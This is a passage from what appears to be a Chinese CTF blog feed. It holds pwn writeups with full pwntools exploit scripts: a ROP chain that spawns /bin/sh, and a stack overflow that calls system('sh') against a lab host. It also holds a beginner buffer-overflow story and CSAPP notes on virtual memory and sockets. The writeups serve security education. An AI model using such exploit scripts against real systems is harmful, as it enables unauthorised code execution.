class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#地址高32位置0</span></span><br><span class="line">io.sendline(<span class="string">'2'</span>)</span><br><span class="line">io.sendline(<span class="string">'42'</span>)</span><br><span class="line">io.sendline(<span class="string">'42'</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#0x0--&gt;rsi = 0</span></span><br><span class="line">io.sendline(<span class="string">'2'</span>)</span><br><span class="line">io.sendline(<span class="string">'42'</span>)</span><br><span class="line">io.sendline(<span class="string">'42'</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#地址高32位置0</span></span><br><span class="line">io.sendline(<span class="string">'2'</span>)</span><br><span class="line">io.sendline(<span class="string">'42'</span>)</span><br><span class="line">io.sendline(<span class="string">'42'</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#0x44db34--&gt;pop rdx; ret</span></span><br><span class="line">io.sendline(<span class="string">'1'</span>)</span><br><span class="line">io.sendline(<span class="string">'2211138'</span>)</span><br><span class="line">io.sendline(<span class="string">'2211139'</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#地址高32位置0</span></span><br><span class="line">io.sendline(<span class="string">'2'</span>)</span><br><span class="line">io.sendline(<span class="string">'42'</span>)</span><br><span class="line">io.sendline(<span class="string">'42'</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#0x0--&gt;rdx = 0</span></span><br><span class="line">io.sendline(<span class="string">'2'</span>)</span><br><span class="line">io.sendline(<span class="string">'42'</span>)</span><br><span class="line">io.sendline(<span class="string">'42'</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#地址高32位置0</span></span><br><span class="line">io.sendline(<span class="string">'2'</span>)</span><br><span class="line">io.sendline(<span class="string">'42'</span>)</span><br><span class="line">io.sendline(<span class="string">'42'</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#0x400493--&gt;pop r12; ret</span></span><br><span class="line">io.sendline(<span class="string">'1'</span>)</span><br><span class="line">io.sendline(<span class="string">'2097737'</span>)</span><br><span class="line">io.sendline(<span class="string">'2097738'</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#地址高32位置0</span></span><br><span class="line">io.sendline(<span class="string">'2'</span>)</span><br><span class="line">io.sendline(<span class="string">'42'</span>)</span><br><span class="line">io.sendline(<span class="string">'42'</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#0x44db34--&gt;syscall; ret	r12 = syscall address</span></span><br><span class="line">io.sendline(<span class="string">'1'</span>)</span><br><span class="line">io.sendline(<span class="string">'2303090'</span>)</span><br><span class="line">io.sendline(<span class="string">'2303091'</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#地址高32位置0</span></span><br><span class="line">io.sendline(<span class="string">'2'</span>)</span><br><span class="line">io.sendline(<span class="string">'42'</span>)</span><br><span class="line">io.sendline(<span class="string">'42'</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#0x492468--&gt; mov rdi, rsp; call r12</span></span><br><span class="line">io.sendline(<span class="string">'1'</span>)</span><br><span class="line">io.sendline(<span class="string">'2396724'</span>)</span><br><span class="line">io.sendline(<span class="string">'2396724'</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#地址高32位置0</span></span><br><span class="line">io.sendline(<span class="string">'2'</span>)</span><br><span class="line">io.sendline(<span class="string">'42'</span>)</span><br><span class="line">io.sendline(<span class="string">'42'</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># /bin/sh\0 =&gt; nib/ \0hs/	rdi = rsp--&gt;"/bin/sh" address</span></span><br><span class="line">io.sendline(<span class="string">'1'</span>)</span><br><span class="line">io.sendline(<span class="string">'926200087'</span>)</span><br><span class="line">io.sendline(<span class="string">'926200088'</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">'1'</span>)</span><br><span class="line">io.sendline(<span class="string">'3422615'</span>)</span><br><span class="line">io.sendline(<span class="string">'3422616'</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">'5'</span>)	<span class="comment">#退出时程序将计算结果从堆复制到栈，劫持RIP到ROP链上</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

</li>
</ul>
]]></content>
      <categories>
        <category>pwn题writeup</category>
      </categories>
  </entry>
  <entry>
    <title>一道简单的ROP题，关于文件中/sh字符串的寻找方法</title>
    <url>/year/08/21/cl7iordp90020293f5uljkel6/</url>
    <content><![CDATA[<p>这道题就是一道简单的ROP，主要学到了找字符串的方法，以前一直不是很清楚。</p>
<a id="more"></a>
<p>首先查看文件格式和保护措施，发现是64位文件动态链接，只开启了NX保护<br><img src="/21/cl7iordp90020293f5uljkel6/check.png" alt="查看文件"><br>然后用ida反汇编查看程序主函数如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 <span class="title">Hello</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  FILE *v2; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Hello pwner, Send me your message here: "</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  fgets(&amp;s, <span class="number">192</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  v2 = fopen(<span class="string">"bugsbunny.txt"</span>, <span class="string">"a"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    fwrite(&amp;s, <span class="number">0x40</span>uLL, <span class="number">1u</span>LL, v2);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"So shorry cant talk to you now :( "</span>);</span><br><span class="line">    result = <span class="number">1L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出fgets出有栈溢出漏洞，我们可以通过这个漏洞劫持返回地址。同时我们在ida还发现了system函数，所以我们只需要调用system函数并满足其参数需要就可以成功拿到shell。以下命令十分好用<br><img src="/21/cl7iordp90020293f5uljkel6/string.png" alt="ROPgadeget--string"><br>然后就可以构造ROP链写脚本了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.update(arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>, timeout = <span class="number">1</span>)</span><br><span class="line">io = remote(<span class="string">'172.17.0.3'</span>, <span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line">call_system = <span class="number">0x40075f</span>			<span class="comment">#call system指令在内存中的位置</span></span><br><span class="line">binsh = <span class="number">0x4003ef</span>			<span class="comment">#字符串"sh"在内存中的位置</span></span><br><span class="line">pop_rdi = <span class="number">0x400883</span>			<span class="comment">#pop rdi; retn</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">""</span></span><br><span class="line">payload += <span class="string">"A"</span>*<span class="number">88</span>			<span class="comment">#padding</span></span><br><span class="line">payload += p64(pop_rdi)		</span><br><span class="line">payload += p64(binsh)		<span class="comment">#rdi指向字符串"sh"</span></span><br><span class="line">payload += p64(call_system)		<span class="comment">#调用system执行system("sh")</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>pwn题writeup</category>
      </categories>
  </entry>
  <entry>
    <title>什么是pwn,新手如何入门?</title>
    <url>/year/08/10/cl7iordq8004m293f7mj7uq7a/</url>
    <content><![CDATA[<p>阅读本文需要的知识储备</p>
<ul>
<li>了解C语言函数的概念</li>
<li>了解C语言指针的概念<a id="more"></a>
<h2 id="什么是漏洞？漏洞会有什么危害？"><a href="#什么是漏洞？漏洞会有什么危害？" class="headerlink" title="什么是漏洞？漏洞会有什么危害？"></a>什么是漏洞？漏洞会有什么危害？</h2>暑假里小明（ctfer）今天去找小红玩耍，却发现刚高考完的小红居然在家自学C语言！沉溺于码代码的小红根本无暇搭理小明，为了搭讪小明无奈凑上前去，在屏幕上看到了如下代码：<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">success</span><span class="params">()</span> </span>&#123; <span class="built_in">puts</span>(<span class="string">"You Hava already controlled it."</span>); &#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">12</span>];</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">  vulnerable();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>小红看着自己代码，志得意满的将自己的代码运行了，可是第三行的success函数并没有执行。呀！原来是自己的主函数里只调用了vulnerable函数，忘记调用success函数了。小红正准备修改自己的代码，却听见小明大喊一声，“慢着！我有办法让你不修改代码也能成功调用success函数。”只见小明一番操作，在小红怀疑的目光下，小明果真将success函数成功调用了。之间屏幕上出现了如下显示（linux界面）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  stack-example python exp.py</span><br><span class="line">[+] Starting local process './stack_example': pid 61936</span><br><span class="line">;\x84\x0</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">aaaaaaaaaaaaaaaaaaaabbbb;\x84\x0</span><br><span class="line">You Hava already controlled it.</span><br><span class="line">[*] Got EOF while reading in interactive</span><br><span class="line"><span class="meta">$</span><span class="bash"> </span></span><br><span class="line">[*] Process './stack_example' stopped with exit code -11 (SIGSEGV) (pid 61936)</span><br><span class="line">[*] Got EOF while sending in interactive</span><br></pre></td></tr></table></figure>

<blockquote>
<p>第一行运行了攻击脚本<br>在第六行，”You Hava already controlled it.”，字符串被成功输出</p>
</blockquote>
<p>小红顿生疑惑：“这是为什么呀，代码里并没有调用这个success函数，为什么你还能成功调用它？”</p>
<p>小明嘿嘿一笑：“因为你的代码里存在着缓冲区溢出漏洞！你看你代码第5行的char s[12]<strong>只给这个s分配了12字节的空间</strong>，但是你第6行的<strong>gets(s),可以没有长度限制的向s里面输入数据</strong>。超出6字节大小的数据就会<strong>覆盖到内存里其它区域的位置</strong>。别人利用这个漏洞，轻则可以调用想调用的函数，获取你程序里的其它数据，重则拿到你系统的操作权限。以后写代码的时候你可长点心吧！”</p>
<p>小红看向小明的眼神顿时充满了崇拜：“那么你能不能教教我怎么利用这种漏洞？”</p>
<p>小明心花怒放：“当然没有问题，其实这只是最基础的一种漏洞，其它漏洞还有很多很多。但是即使是最基础的漏洞，你也要学一些基础的技能，才能够很好的利用他们，这些技能有：</p>
<ol>
<li>扎实的C语言功底，特别是链表和指针这一块，你对语言不够熟悉怎么能发现他们的漏洞是吧？</li>
<li>汇编基础语法（对重点语句call，leave，retn等要有较深的理解）重点对汇编层面的函数调用有较好理解。（平时我们的C语言程序都要先翻译成汇编语言然后再翻译成机器语言然后才能执行，因为计算机其实只认识由0和1组成的机器语言。而汇编语言可以比C语言更低一层，属于低级语言，所以可以反映出更多程序运行的细节，我们也就是通过这些细节来发现和利用漏洞的。）</li>
<li>python基础语法。我们利用漏洞要用python写脚本进行攻击的呀！</li>
<li>linux基本命令。因为linux比较简单，我们前期的漏洞挖掘和利用主要再linux环境下的，<strong>所以你最好装个虚拟机哦。</strong></li>
</ol>
<p>“哇，看起来要学好多东西，可是我还什么都不会呢，我该从何学起呀？”小红疑惑道。</p>
<p>“先把C语言基础打好，<strong>C语言基础</strong>打好以后推荐中国大学mooc上南京大学袁春风老师的慕课，<strong>《计算机系统基础》(建议新生观看一，二，五，六，七，八周的课程）</strong>，这个课能帮你建立一个计算机系统观，对以后的学习很有好处，里面也有你所需要的汇编知识呢，你先学这些，学完以后随时找我！”，小明潇洒的摆了摆手。<br>其它补充资料：汇编语言（王爽），深入理解计算机系统。</p>
<p>“哇，那太好了！”小红说着依偎在了小明怀中，从此他们幸福的走在了一起。</p>
<p><img src="https://www.keaidian.com/uploads/allimg/170320/1_170320231053_1.jpg" alt="图片"></p>
]]></content>
      <categories>
        <category>入门</category>
      </categories>
  </entry>
  <entry>
    <title>第九章 虚拟内存</title>
    <url>/year/07/15/cl7iordqj005c293f17wbs95y/</url>
    <content><![CDATA[<h1 id="虚拟内存"><a href="#虚拟内存" class="headerlink" title="虚拟内存"></a>虚拟内存</h1><p>一个系统中的进程是与其它进程共享CPU和主存资源的。<br>虚拟内存提供了三个重要的能力:</p>
<ol>
<li>它将主存看成是一个存贮在硬盘上的地址空间的高速缓存，在主存中只保存活动区域，并根据需要在磁盘和主存之间来回传送数据，通过这种方式，它高效使用了主存。</li>
<li>它为每个进程提供了一致的地址空间，从而简化了内存管理。</li>
<li>它保护了每个进程的地址空间不被其它进程破坏。<a id="more"></a>
<h2 id="虚拟内存作为缓存的工具"><a href="#虚拟内存作为缓存的工具" class="headerlink" title="虚拟内存作为缓存的工具"></a>虚拟内存作为缓存的工具</h2>概念上而言，虚拟内存被组织为一个由存放在磁盘上的N个连续的字节大小的单元组成的数组。每个字节都有唯一的虚拟地址，作为数组的索引。磁盘上数组的内容被缓存在主存中。和存储器层次结构中的其它缓存一样，磁盘（较低层）上的数据被分割成块，这些块作为磁盘和主存（较高层）之间的传送单元。VM系统通过将虚拟内存分割为称为<strong>虚拟页(Virtual Page, VP)</strong>的大小固定的块来处理这个问题。类似的，物理内存被分割为<strong>物理页</strong>，也被称为页帧。<br>在任意时刻，虚拟页面的集合都分为三个不相交的子集:</li>
<li><strong>未分配的</strong>：VM系统还未分配（或者创建）的页。未分配的块没有任何数据和它们关联，因此也不用占据任何磁盘空间。</li>
<li><strong>缓存的</strong>：当前已缓存在物理内存中的已分配页。</li>
<li><strong>未缓存的</strong>：未缓存在当前物理内存中的已分配页。<h2 id="页表"><a href="#页表" class="headerlink" title="页表"></a>页表</h2><img src="https://segmentfault.com/img/bVEVKj?w=606&h=405" alt="页表"><h2 id="虚拟内存作为内存管理的工具"><a href="#虚拟内存作为内存管理的工具" class="headerlink" title="虚拟内存作为内存管理的工具"></a>虚拟内存作为内存管理的工具</h2>操作系统为每个进程提供一个独立的页表，VM简化了链接和加载,代码和数据共享,以及应用程序的存储器分配。<br><img src="https://segmentfault.com/img/bVEVMa?w=517&h=305" alt></li>
<li><strong>简化链接</strong>。独立的地址空间允许每个进程的内存映像使用相同的基本格式，而不管代码和数据实际存放在物理内存的何处。</li>
<li><strong>简化加载</strong>要把目标文件中。text和。data节加载到一个新创建的进程中，Linux加载器为代码和数据段分配虚拟页，把它们标记为无效的（即未被缓存的），将页表条目指向目标文件中适当的位置。加载器从不从磁盘到内存实际复制任何数据。在每个页被初次引用时，要么是CPU取址时引用的，要么是一条正在执行的指令引用一个内存位置时引用的，虚拟内存会按照需要自动的地调入数据页。</li>
<li><strong>简化共享</strong></li>
<li><strong>简化内存分配</strong><h1 id="Linux虚拟内存系统"><a href="#Linux虚拟内存系统" class="headerlink" title="Linux虚拟内存系统"></a>Linux虚拟内存系统</h1><img src="https://segmentfault.com/img/bVEVUK?w=467&h=531" alt><h2 id="Linux虚拟内存区域"><a href="#Linux虚拟内存区域" class="headerlink" title="Linux虚拟内存区域"></a>Linux虚拟内存区域</h2>Linux为每个进程维持一个单独的虚拟地址空间：<strong>内核虚拟存储器</strong>和进程虚拟存储器。<br>下图强调记录一个进程中虚拟内存区域的内核数据结构。内核为系统中的每个进程维护一个单独的任务结构（源代码中的task_struct）。任务结构中的元素包含或者指向内核运行该进程所需要的所有信息（例如，PID、指向用户栈的指针、可执行目标文件的名子，以及程序计数器）。<br><img src="https://segmentfault.com/img/bVEV2z?w=644&h=483" alt></li>
</ol>
<p>任务结构中的一个条目指向mm_struct，它描述了虚拟内存的当前状态。我们感兴趣的两个字段时pgd和mmap，其中pgd指向第一级页表（页全局目录的基址），而mmap指向一个vm_area_structs（区域结构）的链表，其中每个vm_area_structs都描述了当前虚拟地址空间的一个区域。当内核运行这个进程时，就将pdg存放在CR3控制寄存器中。</p>
<ul>
<li><strong>vm_start</strong>:指向这个区域起始处。</li>
<li><strong>vm_end</strong>:指向这个区域的结束处。</li>
<li><strong>vm_prot</strong>:描述这个区域内包含的所有页的读写许可权限。</li>
<li><strong>vm_flags</strong>:描述这个区域内的页面是与其它进程共享的，还是这个进程私有的（还描述了一些其它信息）。</li>
<li><strong>vm_next</strong>:指向链表中下一个区域结构。<h1 id="存储器映射"><a href="#存储器映射" class="headerlink" title="存储器映射"></a>存储器映射</h1>定义：<br>Linux 通过将一个虚拟存储器区域与一个磁盘上的对象关联，以初始化这个虚拟存储器区域的内容。虚拟存储器区域可以映射到以下两种类型文件：</li>
</ul>
<ol>
<li><strong>Unix文件系统中的普通文件:一个区域可以映射到一个普通磁盘文件的连续部分。</strong><br>例如，一个可执行文件。文件区(section)被分成页大小的片，每一片包含一个虚拟页面的初始化内容。仅仅是初始化，虚拟页面此时还并未进入物理存储器，直到CPU第一次引用这个页面。</li>
<li><strong>匿名文件</strong><br>匿名文件由内核创建，包含的全是二进制零。CPU第一次引用这样区域(匿名文件)的虚拟页面时，将存储器中牺牲页面全部用二进制零覆盖。并将虚拟页面标记为驻留在存储器中。<br>注意在磁盘和存储器之间并没有实际的数据传送。又叫请求二进制零的页(demand-zero page)。<h2 id="再看共享对象"><a href="#再看共享对象" class="headerlink" title="再看共享对象"></a>再看共享对象</h2><img src="https://segmentfault.com/img/bVEWEi?w=910&h=445" alt></li>
</ol>
<p><strong>私有对象的写时复制</strong><br><img src="https://segmentfault.com/img/bVEWGc?w=896&h=443" alt></p>
<h2 id="再看fork函数"><a href="#再看fork函数" class="headerlink" title="再看fork函数"></a>再看fork函数</h2><p>当fork函数被<strong>当前进程</strong>调用时，内核为<strong>新进程</strong>创建各种数据结构，并分配给它唯一的PID。为了给这个新进程创建虚拟内存，它创建了当前进程的mm_struct、区域结构和页表的原样副本。它将两个进程中的每个页面都标记为只读，并将两个进程中的每个区域结构都标记为私有的写时复制。</p>
<p>当fork在新进程中返回时，新进程现在的虚拟内存刚好和调用fork时存在的虚拟内存相同。当这两个进程中的任一个后来进行写操作时，写时复制就会创建新页面，因此，也就为每个进程保持了私有地址空间的抽象概念。</p>
<h2 id="再看execve函数"><a href="#再看execve函数" class="headerlink" title="再看execve函数"></a>再看execve函数</h2><p>假设调用了<code>execve(&quot;a.out&quot;,NULL,NULL);</code>execve函数在当前进程中加载并运行包含在可执行目标文件a.out中的程序，用a.out代替了当前程序。</p>
<ol>
<li><strong>删除已存在的用户区</strong>删除当前进程虚拟地址的用户部分中已存在的区域结构。</li>
<li><strong>映射私有区域</strong>为新程序的文本，数据，bss和栈区域创建新的区域结构。所有新的区域结构都是私有的，写时拷贝的。 文本和数据区域被映射到a.out文件中的文件和数据区。bss区域是请求二进制零，映射到匿名文件</li>
<li><strong>映射共享区域</strong></li>
<li><strong>设置PC。</strong><br><img src="https://segmentfault.com/img/bVEWKe?w=800&h=447" alt><h2 id="使用mmap函数的用户级内存映射"><a href="#使用mmap函数的用户级内存映射" class="headerlink" title="使用mmap函数的用户级内存映射"></a>使用mmap函数的用户级内存映射</h2>Linux进程可以使用mmap函数来创建新的虚拟内存区域，并将对象映射到这些区域中。<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mmap</span><span class="params">(<span class="keyword">void</span> *start, <span class="keyword">size_t</span> length, <span class="keyword">int</span> port, <span class="keyword">int</span> flags,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">int</span> fd, <span class="keyword">off_t</span> offset)</span></span>;</span><br><span class="line"></span><br><span class="line">    返回：若成功则为指向映射区域的指针，若出错则为<span class="number">-1</span>。</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>munmap函数删除虚拟存储器的区域</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">munmap</span><span class="params">(<span class="keyword">void</span> *start,<span class="keyword">size_t</span> length)</span></span>;</span><br><span class="line"></span><br><span class="line">返回：若成功则为<span class="number">0</span>，若出错则为<span class="number">-1</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CSAPP</category>
      </categories>
  </entry>
  <entry>
    <title>第十一章 网络编程</title>
    <url>/year/07/10/cl7iordqm005l293fpn9gs8n3/</url>
    <content><![CDATA[<h2 id="客户端-服务器编程模型"><a href="#客户端-服务器编程模型" class="headerlink" title="客户端-服务器编程模型"></a>客户端-服务器编程模型</h2><p>每个网络应用都是基于<em>客户端-服务器</em>模型的。采用这个模型，一个应用是由一个<em>服务器</em>进程和一个或多个<em>客户端</em>进程组成。<br>客户端-服务器模型中的基本操作是<strong>事务(transaction)</strong>。一个客户端-服务器事物由以下四步组成。</p>
<a id="more"></a>

<ol>
<li>当一个客户端需要服务时，他就向服务器发送一个<strong>请求</strong>，发起一个事物。例如，当Web浏览器需要一个文件时，它就发送一个请求给Web服务器。</li>
<li>服务器收到请求后，解释它，并以适当的方式操作它的资源。例如，当Web服务器收到浏览器发出的请求后，它就读取一个磁盘文件。</li>
<li>服务器给客户端发送一个<strong>响应</strong>，并等待下一个请求。例如，Web服务器将文件发送回客户端。</li>
<li>客户端收到响应并处理它。例如，当Web浏览器收到来自服务器的一页后，就在屏幕上显示此页。</li>
</ol>
<p><em>认识到客户端和服务器是进程，而不是常提到的机器或者主机，这是很重要的。</em></p>
<h2 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h2><p>客户端和服务器通常运行在不同的主机上，并通过计算机网络的硬件和软件资源来通信。</p>
<p>对主机而言，网络是一种I/O设备，是数据源和数据接收方。</p>
<h2 id="全球IP因特网"><a href="#全球IP因特网" class="headerlink" title="全球IP因特网"></a>全球IP因特网</h2><p>因特网的客户端和服务器混合使用<strong>套接字接口</strong>函数和Unix I/O函数来进行通信。通常将套接字函数实现为系统调用，这些系统调用会陷入内核，并调用各种内核模式的TCP/IP函数。</p>
<ul>
<li>主机集合被映射为一组32位的IP地址。</li>
<li>这组IP地址被映射为一组称为 <strong>因特网域名(Internet domain name)</strong> 的标识符。</li>
<li>因特网主机上的进程能够通过 <strong>连接(connection)</strong> 和任何其他因特网主机上的进程通信。<h2 id="IP地址"><a href="#IP地址" class="headerlink" title="IP地址"></a>IP地址</h2>IP地址存放在IP地址结构中<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span>&#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> s_addr; <span class="comment">/*Address in network byte order (big-endian)</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>主机字节顺序与网络字节顺序互换</p>
<p>因为因特网主机可以有不同的主机字节顺序，TCP/IP为任意整数数据项定义了统一的网络字节顺序（大端字节顺序）。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">htonl</span><span class="params">(<span class="keyword">uint32_t</span> hostlong)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">uint16_t</span> <span class="title">htons</span><span class="params">(<span class="keyword">uint26_t</span> hostshort)</span></span>;<span class="comment">//返回：网络字节顺序值</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">ntohl</span><span class="params">(<span class="keyword">uint32_t</span> netlong)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">uint16_t</span> <span class="title">ntohs</span><span class="params">(<span class="keyword">uint16_t</span> netshort)</span></span>;<span class="comment">//返回：主机字节顺序值</span></span><br></pre></td></tr></table></figure>

<p>inet_pton函数将点分十进制字符串转换为二进制的网络字节顺序的IP地址，inet_ntop函数将一个二进制的网络字节序的IP地址转换为点分十进制。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">inet_pton</span><span class="params">(AF_INET,<span class="keyword">const</span> <span class="keyword">char</span> *src,<span class="keyword">void</span> *dst)</span></span>;</span><br><span class="line"><span class="comment">//返回：成功则为1，若src为非法点分十进制地址则为0，出错为-1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">const</span> <span class="keyword">char</span> *<span class="title">inet_ntop</span><span class="params">(AF_INET,<span class="keyword">const</span> <span class="keyword">void</span> *src,<span class="keyword">char</span> *dst)</span></span>;</span><br><span class="line"><span class="comment">//返回：成功则指向点分十进制字符串的指针，出错为NULL</span></span><br></pre></td></tr></table></figure>

<h2 id="因特网连接"><a href="#因特网连接" class="headerlink" title="因特网连接"></a>因特网连接</h2><p>一个<strong>套接字</strong>是连接的一个端点。每个套接字都有相应的<strong>套接字地址</strong>，是由一个因特网地址和一个16位的整数端口组成的，用“地址：端口”来表示。</p>
<p>一个连接是由它两端的套接字地址唯一确定的。这对套接字地址叫做<strong>套接字对(socket  pair)</strong></p>
<h2 id="套接字的地址结构"><a href="#套接字的地址结构" class="headerlink" title="套接字的地址结构"></a>套接字的地址结构</h2><p>从Linux内核的角度看，一个套接字就是通信的一个端点。从Linux程序的角度来看，套接字就是一个有相应描述符的打开文件。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint16_t</span> sin_family; <span class="comment">/*Protocol family(always AF_INET)*/</span></span><br><span class="line">    <span class="keyword">uint16_t</span> <span class="built_in">sin</span> port;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> <span class="title">sin_addr</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> sin_zero[<span class="number">8</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//通用套接字结构</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint16_t</span> sa_family;</span><br><span class="line">    <span class="keyword">char</span> sa_data[<span class="number">14</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以通过下图理解各个函数。<br><img src="https://blog-pictures.oss-cn-shanghai.aliyuncs.com/15218834057254.jpg" alt="套接字接口的应用"></p>
<h2 id="socket函数"><a href="#socket函数" class="headerlink" title="socket函数"></a>socket函数</h2><p>客户端和服务器使用socket函数来创建一个<strong>套接字描述符(socket descriptor)</strong>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">socket</span><span class="params">(<span class="keyword">int</span> domain, <span class="keyword">int</span> type, <span class="keyword">int</span> protocol)</span></span>;</span><br><span class="line">                        <span class="comment">//返回:若成功则为非负描述符，若出错则为-1</span></span><br></pre></td></tr></table></figure>

